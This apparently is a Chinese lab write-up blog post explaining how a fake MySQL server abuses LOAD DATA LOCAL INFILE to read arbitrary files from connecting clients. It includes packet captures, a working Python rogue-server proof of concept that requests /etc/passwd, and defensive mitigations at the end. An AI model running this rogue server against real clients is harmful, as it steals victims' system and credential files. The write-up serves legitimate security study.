@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>实验--Mysql服务端反向读取客户端的任意文件 - inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="摘要伪造MySQL服务器对客户端实现任意文件读取"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="摘要伪造MySQL服务器对客户端实现任意文件读取"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:published_time" content="2021-09-08T05:51:10.185Z"><meta property="article:modified_time" content="2021-09-08T10:06:22.892Z"><meta property="article:author" content="removeif"><meta property="article:tag" content="buuctf"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/"},"headline":"inanb","image":["http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908143517892.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908144742807.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908145538553.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908153753755.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908154314188.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171243202.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171746376.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171922416.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908173513285.png","http://example.com/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908174329155.png"],"datePublished":"2021-09-08T05:51:10.185Z","dateModified":"2021-09-08T10:06:22.892Z","author":{"@type":"Person","name":"inanb"},"description":"摘要伪造MySQL服务器对客户端实现任意文件读取"}</script><link rel="canonical" href="http://example.com/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/"><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
+</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/music">音色</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-09-08  <a class="commentCountImg" href="/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/#comment-container"><span class="display-none-class">/2021/09/08/实验--Mysql服务端反向读取客户端的任意文件/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="7048fa5794e01d6acbf40b60fb253c24">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>15 分钟  <i class="fas fa-pencil-alt"> </i>2.3 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">实验--Mysql服务端反向读取客户端的任意文件</h1><div class="content"><blockquote>
+<p>摘要<br>伪造MySQL服务器对客户端实现任意文件读取</p>
+<a id="more"></a>
+</blockquote>
+<div class="toc" tabindex="1">
+
+<!-- toc -->
+
+<ul>
+<li><a href="#%E5%AE%9E%E9%AA%8C-mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6">实验–Mysql服务端反向读取客户端的任意文件</a><ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-kali%E4%B8%8A%E5%AE%89%E8%A3%85mysql">环境准备-kali上安装mysql</a><ul>
+<li><a href="#1%E5%AE%89%E8%A3%85%E5%8C%85">1.安装包</a></li>
+<li><a href="#2%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE">2.文件配置</a></li>
+<li><a href="#3%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96">3.启动与初始化</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87">原理准备</a><ul>
+<li><a href="#-load-data-infile">-Load Data infile</a></li>
+<li><a href="#-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90">-抓包分析</a><ul>
+<li><a href="#%E6%8F%A1%E6%89%8B%E8%AE%A4%E8%AF%81%E9%98%B6%E6%AE%B5">握手认证阶段</a></li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5">命令执行阶段</a></li>
+</ul>
+</li>
+<li><a href="#-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84file-transfer">-不安全的file-transfer</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E5%99%A8">伪造MySQL服务器</a><ul>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6">攻击条件</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">攻击流程</a></li>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0"><strong>服务端伪造</strong></a><ul>
+<li><a href="#-%E5%8C%85%E4%BC%AA%E9%80%A0">-包伪造：</a></li>
+<li><a href="#-poc">-PoC</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95">攻击测试</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96poc">其他PoC</a></li>
+<li><a href="#%E5%AD%A6%E4%B9%A0">学习</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+</div><br>
+### 实验--Mysql服务端反向读取客户端的任意文件
+
+<blockquote>
+<p>实验环境：</p>
+<p>客户端：kali-linux-2020.3 | MySQL：10.5.12-MariaDB-1</p>
+<p>服务端：centos8 | MySQL：5.6.50-log </p>
+<p>综合参考：<a target="_blank" rel="noopener" href="https://lightless.me/archives/read-mysql-client-file.html">https://lightless.me/archives/read-mysql-client-file.html</a></p>
+</blockquote>
+<h4><span id="环境准备-kali上安装mysql">环境准备-kali上安装mysql</span></h4><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/faithfu/p/10278163.html">https://www.cnblogs.com/faithfu/p/10278163.html</a></p>
+</blockquote>
+<h5><span id="1安装包">1.安装包</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mariadb-client</span><br><span class="line">apt-get install mariadb-server</span><br></pre></td></tr></table></figure>
+
+<h5><span id="2文件配置">2.文件配置</span></h5><p><code>/etc/mysql/my.cnf</code> 添加：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[client-server]</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="attr">port</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">socket</span>    = /tmp/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">basedir</span>=/usr/local/mysql/</span><br><span class="line"><span class="attr">datadir</span>=/usr/local/mysql/data/mysql</span><br><span class="line"><span class="comment">#character-set-server=utf8</span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="3启动与初始化">3.启动与初始化</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysql start #启动myslq</span><br><span class="line">mysql_secure_installation #初始化密码</span><br><span class="line">.....自定义安装</span><br></pre></td></tr></table></figure>
+
+<h4><span id="原理准备">原理准备</span></h4><h5><span id="-load-data-infile">-Load Data infile</span></h5><blockquote>
+<p>LOAD DATA INFILE 语句以非常高的速度从文本文件中读取行到表中，可用来快速导入数据</p>
+</blockquote>
+<p>该语法通常有两种用法，分别是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&quot;/data/data.csv&quot;</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">&quot;/home/lightless/data.csv&quot;</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>有时候也会与<code>FIELDS TERMINATED BY &#39;\n&#39;</code>一起使用，效果更佳。这两种用法的区别就是差了一个<code>local</code>，第一个 SQL 语句的意思是，读取服务器上<code>/data/data.csv</code>文件，并写入到<code>TestTable</code>中；第二个 SQL 语句的意思则是，读取本地（客户端）这边的<code>/home/lightless/data.csv</code>文件，并写入到<code>TestTable</code>中。而我们这次要利用的也就是<code>LOAD DATA LOCAL INFILE</code>这种形式。</p>
+</blockquote>
+<p><code>load data local infile</code> 就是客户端申请将本地文件写入表中的语句，我们可以从这个语句切入，看看这个机制是如何运作的</p>
+<h5><span id="-抓包分析">-抓包分析</span></h5><blockquote>
+<p>参考：</p>
+<p>– <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3d26180268d7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">抓包分析参考</a></p>
+<p>– <a target="_blank" rel="noopener" href="https://blog.csdn.net/LYue123/article/details/89256577?spm=1001.2014.3001.5501"><strong>彻底弄懂mysql（一）–mysql的通信协议 ★</strong></a></p>
+</blockquote>
+<h6><span id="握手认证阶段">握手认证阶段</span></h6><p>wireshark 过滤设置<code>port：3036</code></p>
+<p>kali远程连接服务器上的mysql：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h xxxx -u test -p</span><br></pre></td></tr></table></figure>
+
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908143517892.png" alt="image-20210908143517892" style="zoom:80%;">
+
+<p>这十三条响应就是客户端与服务端建立连接的过程</p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908144742807.png" alt="image-20210908144742807" style="zoom:80%;">
+
+<p>可以看到在<strong>握手认证阶段</strong>：</p>
+<ol>
+<li>greeting <strong>握手初始化包</strong></li>
+<li>login <strong>登陆认证消息</strong></li>
+<li>Response OK <strong>认证结果</strong></li>
+<li>初始化查询语句等  <code>Statement: select @@version_comment limit 1</code> ……</li>
+</ol>
+<p>认证成功则会进入<strong>命令执行阶段</strong>；</p>
+<h6><span id="命令执行阶段">命令执行阶段</span></h6><p>现在在客户机上执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908145538553.png" alt="image-20210908145538553" style="zoom:80%;">
+
+<ol>
+<li>query语句发送，申请上传文件</li>
+<li>服务器返回一个文件传输申请（<strong>file-transfer请求</strong>）（TABULAR）</li>
+<li>客户端发送<code>Malformed Packet</code>包，包含上传的<strong>数据文件</strong></li>
+</ol>
+<p>这看起来十分合理！</p>
+<h5><span id="-不安全的file-transfer">-不安全的file-transfer</span></h5><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rain99-/p/13334755.html#41-mysql%E5%8E%9F%E7%94%9Fclient">https://www.cnblogs.com/Rain99-/p/13334755.html#41-mysql%E5%8E%9F%E7%94%9Fclient</a></p>
+</blockquote>
+<blockquote>
+<p>Mysql官方文档：</p>
+<p>一：</p>
+<p>“In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement.”</p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908153753755.png" alt="image-20210908153753755" style="zoom:80%;">
+
+<p>二：</p>
+<p>“A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL”</p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908154314188.png" alt="image-20210908154314188" style="zoom:80%;">
+</blockquote>
+<p>无论你是否使用<strong>LOAD DATA LOCAL</strong>，服务端都可以<strong>回复一个 file-transfer 请求</strong>，客户端接到此请求，就会返回一个<strong>指定的文件内容</strong>。</p>
+<p>于是，我们依照此思路，伪造一个MySQL服务器，伪造发包即可。</p>
+<h4><span id="伪造mysql服务器">伪造MySQL服务器</span></h4><h5><span id="攻击条件">攻击条件</span></h5><p>如果想要利用此特性，客户端必须具有 <code>CLIENT_LOCAL_FILES</code> 属性，所以请求连接时可能要添加<code>--enable-local-infile</code>以打开功能。现实情况中，某些功能的开启可能需要此属性。</p>
+<h5><span id="攻击流程">攻击流程</span></h5><blockquote>
+<ol>
+<li>受害者向攻击者提供的服务器发起请求，并尝试进行身份认证。</li>
+<li>攻击者的MySQL接受到受害者的连接请求，攻击者发送正常的问候、身份验证正确，成功连接后向受害者的MySQL客户端请求文件。</li>
+<li>受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过 <code>LOAD DATA INLINE</code> 功能将文件内容发送回攻击者的MySQL服务器。</li>
+<li>攻击者收到受害者服务器上的信息，读取文件成功，攻击完成。</li>
+</ol>
+</blockquote>
+<h5><span id="服务端伪造"><strong>服务端伪造</strong></span></h5><blockquote>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/apossin/p/10127496.html">分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3d26180268d7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">抓包分析参考</a></p>
+</blockquote>
+<h6><span id="-包伪造">-包伪造：</span></h6><blockquote>
+<p>不需要真的搞个Mysql服务，在mysql客户端连接时，模仿服务端返回Server Greeting<br>等待 Client 端发送一个<strong>Query Package</strong>后<br>回复一个<strong>file transfer</strong>请求<br>即可读取到文件</p>
+<p>大概就像……：</p>
+<p><strong>客户端：hi,现在我要查询一下版本信息</strong><br><strong>服务端：好的，把/etc/passwd文件发过来吧</strong><br><strong>客户端：好的，这是我的/etc/passwd文件</strong></p>
+</blockquote>
+<p>我们用python模拟这一过程，不用去考虑其他层次的协议，python帮助我们完成了这个工作，只需要关注<strong>MySQL Protocol</strong></p>
+<p><strong>greeting package</strong>：</p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171243202.png" alt="image-20210908171243202" style="zoom:80%;">
+
+<p><strong>auth ：认证消息包</strong></p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171746376.png" alt="image-20210908171746376" style="zoom:80%;">
+
+<p><strong>file-transfer ：文件传输请求</strong></p>
+<p>格式：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/internals/en/com-query-response.html">https://dev.mysql.com/doc/internals/en/com-query-response.html</a></p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171922416.png" alt="image-20210908171922416" style="zoom:80%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0c 00 00 01 fb 2f 65 74    63 2f 70 61 73 73 77 64    .....&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>前面的<code>0x0c</code>是数据包的长度（从 \ xfb 开始计算），长度后面的三个字节<code>\x00\x00\x01</code>是数据包的序号。</p>
+<p>即：<code>数据包长度</code>+<code>数据包序号</code>+<code>数据包内容</code>；</p>
+<blockquote>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908173513285.png" alt="image-20210908173513285" style="zoom:80%;">
+
+<p><em>我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求</em></p>
+</blockquote>
+<p>那么，如何做呢？</p>
+<h6><span id="-poc">-PoC</span></h6><blockquote>
+<p>参考：*<a target="_blank" rel="noopener" href="https://www.cnblogs.com/apossin/p/10127496.html">PoC参考</a>*</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment">#python 2</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;/etc/passwd&quot;</span> <span class="comment">#索求文件</span></span><br><span class="line">sv = socket.socket()</span><br><span class="line">sv.bind((<span class="string">&quot;&quot;</span>, <span class="number">6666</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn, address = sv.accept() <span class="comment">#被动建立连接</span></span><br><span class="line">logging.info(<span class="string">&#x27;Conn from: %r&#x27;</span>, address)</span><br><span class="line">greeting1 = <span class="string">&quot;\x4e\x00\x00\x00\x0a\x35\x2e\x36\x2e\x35\x30\x2d\x6c\x6f\x67\x00&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x1b\x02\x00\x00\x59\x22\x38\x37\x49\x48\x6c\x6a\x00\xff\xf7\x2d&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4f&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x2e\x34\x5b\x4e\x56\x46\x3b\x34\x34\x48\x4e\x00\x6d\x79\x73\x71&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x64\x00&quot;</span> <span class="comment">#原greeting包</span></span><br><span class="line"><span class="comment">#个人抓包得greeting包</span></span><br><span class="line">greeting2 = <span class="string">&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff&quot;</span> \</span><br><span class="line">            <span class="string">&quot;\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a&quot;</span> \</span><br><span class="line">            <span class="string">&quot;\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00 &quot;</span></span><br><span class="line"></span><br><span class="line">conn.sendall(greeting1)</span><br><span class="line"></span><br><span class="line">conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(<span class="string">&quot;auth okay&quot;</span>) <span class="comment">#response ok 建立连接</span></span><br><span class="line">conn.sendall(<span class="string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(<span class="string">&quot;want file...&quot;</span>)</span><br><span class="line"><span class="comment">#file-transfer 文件传输请求,根据长度自动构造</span></span><br><span class="line">wantfile = <span class="built_in">chr</span>(<span class="built_in">len</span>(filename) + <span class="number">1</span>) + <span class="string">&quot;\x00\x00\x01\xFB&quot;</span> + filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content = conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<h4><span id="攻击测试">攻击测试</span></h4><p>服务器在 <code>6666</code> 开启服务</p>
+<p>客户机：<code>mysql -h ip:xxxxx -P 6666 --enable-local-infile</code></p>
+<img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908174329155.png" alt="image-20210908174329155" style="zoom:80%;">
+
+<p>效果拔群🤣！</p>
+<h4><span id="其他poc">其他PoC</span></h4><p>大佬脚本：<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<blockquote>
+<p>脚本运行后，会在当前目录下生成mysql.log目录，有客户端连接上后，进行记录，并且将文件读取存入，我们打开mysql.log文件，可以看到成功读取。</p>
+</blockquote>
+<h4><span id="学习">学习</span></h4><p>学习大佬的总结😂：</p>
+<blockquote>
+<p>对于这种攻击的防御，说起来比较简单，首先一点就是客户端要避免使用 LOCAL 来读取本地文件。但是这样并不能避免连接到恶意的服务器上，如果想规避这种情况，可以使用<code>--ssl-mode=VERIFY_IDENTITY</code>来建立可信的连接。</p>
+<p>当然最靠谱的方式还是要从配置文件上根治，关于配置上的防御问题，可以参考<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html">这篇文档</a>进行设置。</p>
+<p>用途的话，做蜜罐是肯定可以的，但是受众面好像不太完整，各种语言的支持都不太一样，比如 Python 中的 MySQLdb 包，原作者说这个包不受影响，但是我测试的时候确是受影响的，而 PHP+PDO 的方式又不受影响，所以能否中招还是要靠一些运气。</p>
+<p>而且这些语言中的三方包在连接<code>MySQL</code>的时候，基本上在连接成功之后都会发出一下<code>SELECT</code>语句来查询一些版本号、编码之类的数据，这就达成了前面提到过的第二个攻击条件：等待客户端发来一个<code>QUERY</code>请求，所以如果这些第三方包允许执行<code>LOAD DATA INFILE</code>，危害还是比较大的。</p>
+</blockquote>
+<p>参考文章:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rain99-/p/13334755.html">Mysql服务端反向读取客户端的任意文件</a></p>
+<p><a target="_blank" rel="noopener" href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read</a></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>实验--Mysql服务端反向读取客户端的任意文件</p><p><a href="http://example.com/2021/09/08/实验--Mysql服务端反向读取客户端的任意文件/">http://example.com/2021/09/08/实验--Mysql服务端反向读取客户端的任意文件/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="http://example.com"><p>inanb</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-09-08</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-09-08</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/2021/09/09/N1CTF-2018-eating_cms/" target="_blank">N1CTF-2018-eating_cms</a><br></span><span>  2.<a class="is-size-6" href="/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/" target="_blank">Black-Watch-入群题-Web</a><br></span><span>  3.<a class="is-size-6" href="/2021/09/03/b01lers2020-Life_on_Mars/" target="_blank">b01lers2020-Life_on_Mars</a><br></span><span>  4.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>  5.<a class="is-size-6" href="/2021/08/31/SUCTF-2018-GetShell/" target="_blank">SUCTF-2018-GetShell</a><br></span><span>  6.<a class="is-size-6" 